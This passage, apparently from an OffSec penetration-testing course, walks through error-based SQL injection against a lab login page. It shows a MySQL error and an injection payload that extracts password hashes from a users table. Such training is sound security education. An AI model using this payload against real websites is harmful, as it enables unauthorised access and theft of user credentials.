# OffSec

After inserting the value into the Username field and submitting the query, we receive the following error:

![](bbox=[0.134, 0.142, 0.866, 0.433])

Fatal error: Uncaught mysqli_sql_exception: Operand should contain 1 column(s) in /var/www/html/login1.php:85 Stack trace: #0 /var/www/html/login1.php(85): mysqli_query() #1 /var/www/html/index.php(30): include('..') #{main} thrown in /var/www/html/login1.php on line 85

Figure 15: Testing for Error-based payload

This means that we should query one column at a time. Let's try to grab the password column from the users table.

> ' or 1=1 in (SELECT password FROM users) -- //

After submitting the payload, we receive several errors along with values resembling MD5 password hashes.